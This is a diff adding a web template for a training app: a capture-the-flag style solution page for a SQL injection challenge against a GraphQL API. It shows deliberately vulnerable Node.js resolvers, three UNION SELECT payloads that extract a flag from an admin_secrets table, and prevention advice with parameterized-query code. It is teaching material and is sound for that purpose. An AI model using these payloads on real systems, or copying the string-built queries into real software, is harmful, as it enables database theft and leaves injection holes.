@@ -1,0 +1,242 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: SQL Injection Level 21{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-success text-white">
+                <h2 class="text-center">Solution: Level 21 - SQL Injection in GraphQL API</h2>
+            </div>
+            <div class="card-body">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates a SQL injection vulnerability in a GraphQL API. GraphQL is a query language for APIs that allows clients to request exactly the data they need. Unlike REST APIs, GraphQL provides a more flexible and efficient approach to data fetching.
+                </p>
+                <p>
+                    The vulnerability occurs because:
+                </p>
+                <ul>
+                    <li>The GraphQL resolvers process user-provided arguments</li>
+                    <li>These arguments are used directly in SQL queries without proper validation or parameterization</li>
+                    <li>The resolvers fail to properly sanitize or escape special characters in the input</li>
+                </ul>
+                <p>
+                    This type of vulnerability is particularly dangerous because GraphQL APIs often provide access to multiple data sources and tables, and the flexible nature of GraphQL can make it harder to identify and secure all entry points.
+                </p>
+
+                <h3>The Vulnerable Code</h3>
+                <p>
+                    The vulnerability exists in how the GraphQL resolvers process user-provided arguments and use them in SQL queries. Here's a simplified example of the vulnerable code:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>// Vulnerable code example (Node.js with GraphQL and MySQL)
+const userResolver = {
+  Query: {
+    user: async (_, { id }) => {
+      // Vulnerable SQL query
+      const query = `SELECT * FROM users WHERE id = ${id}`;
+      const [rows] = await db.query(query);
+      return rows[0];
+    },
+    products: async (_, { category }) => {
+      // Vulnerable SQL query
+      let query = 'SELECT * FROM products';
+
+      if (category) {
+        query += ` WHERE category = '${category}'`;
+      }
+
+      const [rows] = await db.query(query);
+      return rows;
+    }
+  }
+};</code></pre>
+                <p>
+                    The vulnerability is in the direct use of <code>id</code> and <code>category</code> parameters in the SQL queries without proper sanitization or parameterization.
+                </p>
+
+                <h3>Solution</h3>
+                <p>To exploit this vulnerability, follow these steps:</p>
+
+                <h4>1. Understand the GraphQL Schema</h4>
+                <p>
+                    First, we need to understand the GraphQL schema and available queries. Based on the schema provided in the challenge, we can see that there are several query types:
+                </p>
+                <ul>
+                    <li><code>user(id: ID!)</code>: Returns a user by ID</li>
+                    <li><code>users</code>: Returns all users</li>
+                    <li><code>product(id: ID!)</code>: Returns a product by ID</li>
+                    <li><code>products(category: String)</code>: Returns products by category</li>
+                    <li><code>order(id: ID!)</code>: Returns an order by ID</li>
+                    <li><code>orders(userId: ID)</code>: Returns orders by user ID</li>
+                </ul>
+
+                <h4>2. Identify the Vulnerable Parameters</h4>
+                <p>
+                    Based on the schema, several parameters could be vulnerable to SQL injection, including <code>id</code> in the <code>user</code> query, <code>category</code> in the <code>products</code> query, and <code>id</code> in the <code>order</code> query. For this challenge, we'll focus on the <code>id</code> parameter in the <code>user</code> query.
+                </p>
+
+                <h4>3. Craft a SQL Injection Payload</h4>
+                <p>
+                    We can craft a payload that exploits the SQL injection vulnerability in the <code>id</code> parameter to access the restricted table mentioned in the developer note:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>query {
+  user(id: "1 UNION SELECT id, flag as username, flag as email, 'admin' as role FROM admin_secrets -- ") {
+    id
+    username
+    email
+    role
+  }
+}</code></pre>
+                </div>
+                <p>
+                    When this GraphQL query is processed, the resulting SQL query will be:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT * FROM users WHERE id = 1 UNION SELECT id, flag as username, flag as email, 'admin' as role FROM admin_secrets -- </code></pre>
+                <p>
+                    This query will return the user with ID 1 as well as all rows from the admin_secrets table, with the flag field mapped to both the username and email fields. The <code>--</code> comments out the rest of the query, preventing syntax errors.
+                </p>
+
+                <h4>4. Alternative Approach: Using the Category Parameter</h4>
+                <p>
+                    If the <code>id</code> parameter in the <code>user</code> query is properly sanitized, we can try injecting through the <code>category</code> parameter in the <code>products</code> query:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>query {
+  products(category: "Electronics' UNION SELECT id, flag as name, flag as description, 999.99 as price, 'Restricted' as category FROM admin_secrets -- ") {
+    id
+    name
+    description
+    price
+    category
+  }
+}</code></pre>
+                </div>
+                <p>
+                    This will cause the application to execute:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>SELECT * FROM products WHERE category = 'Electronics' UNION SELECT id, flag as name, flag as description, 999.99 as price, 'Restricted' as category FROM admin_secrets -- '</code></pre>
+                <p>
+                    This query will return products in the Electronics category as well as all rows from the admin_secrets table, with the flag field mapped to both the name and description fields.
+                </p>
+
+                <h4>5. More Advanced Approach: Using Nested Queries</h4>
+                <p>
+                    GraphQL allows for nested queries, which can be used to exploit SQL injection vulnerabilities in more complex ways:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>query {
+  user(id: "1") {
+    id
+    username
+    email
+    orders {
+      id
+      products(category: "Electronics' UNION SELECT id, flag as name, flag as description, 999.99 as price, 'Restricted' as category FROM admin_secrets -- ") {
+        id
+        name
+        description
+      }
+    }
+  }
+}</code></pre>
+                </div>
+                <p>
+                    This query exploits a potential SQL injection vulnerability in the nested <code>products</code> query within the <code>orders</code> field of the <code>user</code> query.
+                </p>
+
+                <h4>6. Execute the GraphQL Query</h4>
+                <p>
+                    To exploit the vulnerability, we need to execute our crafted GraphQL query. In the challenge interface, we can paste our payload into the GraphQL playground and click the "Execute" button.
+                </p>
+                <p>
+                    When the server processes our query, it will execute the injected SQL query and return the flag from the admin_secrets table.
+                </p>
+
+                <h3>Real-world Impact</h3>
+                <p>
+                    SQL injection vulnerabilities in GraphQL APIs are particularly relevant in:
+                </p>
+                <ul>
+                    <li><strong>E-commerce Platforms</strong>: GraphQL APIs used for product catalogs and user accounts</li>
+                    <li><strong>Social Media Applications</strong>: GraphQL APIs used for user profiles and content feeds</li>
+                    <li><strong>Financial Services</strong>: GraphQL APIs used for transaction data and account information</li>
+                    <li><strong>Content Management Systems</strong>: GraphQL APIs used for content retrieval and management</li>
+                </ul>
+                <p>
+                    The impact of these vulnerabilities can be severe:
+                </p>
+                <ul>
+                    <li>Unauthorized access to sensitive user data</li>
+                    <li>Exposure of business information</li>
+                    <li>Manipulation of database records</li>
+                    <li>Complete compromise of the database</li>
+                </ul>
+
+                <h3>Prevention</h3>
+                <p>To prevent SQL injection vulnerabilities in GraphQL APIs, developers should:</p>
+                <ul>
+                    <li>
+                        <strong>Use Parameterized Queries</strong> or prepared statements:
+                        <pre class="bg-light p-3 rounded"><code>// Safe code example (Node.js with GraphQL and MySQL)
+const userResolver = {
+  Query: {
+    user: async (_, { id }) => {
+      // Safe parameterized query
+      const query = 'SELECT * FROM users WHERE id = ?';
+      const [rows] = await db.query(query, [id]);
+      return rows[0];
+    },
+    products: async (_, { category }) => {
+      // Safe parameterized query
+      let query = 'SELECT * FROM products';
+      let params = [];
+
+      if (category) {
+        query += ' WHERE category = ?';
+        params.push(category);
+      }
+
+      const [rows] = await db.query(query, params);
+      return rows;
+    }
+  }
+};</code></pre>
+                    </li>
+                    <li>
+                        <strong>Validate and Sanitize GraphQL Input</strong>:
+                        <ul>
+                            <li>Validate input types and formats</li>
+                            <li>Use GraphQL input validation directives</li>
+                            <li>Implement custom validation logic in resolvers</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Implement Proper Access Controls</strong>:
+                        <ul>
+                            <li>Use authentication and authorization in GraphQL resolvers</li>
+                            <li>Apply the principle of least privilege to database access</li>
+                            <li>Implement field-level access control</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Use GraphQL-specific Security Best Practices</strong>:
+                        <ul>
+                            <li>Disable introspection in production</li>
+                            <li>Implement query complexity analysis</li>
+                            <li>Set depth and rate limits for queries</li>
+                        </ul>
+                    </li>
+                </ul>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level21') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
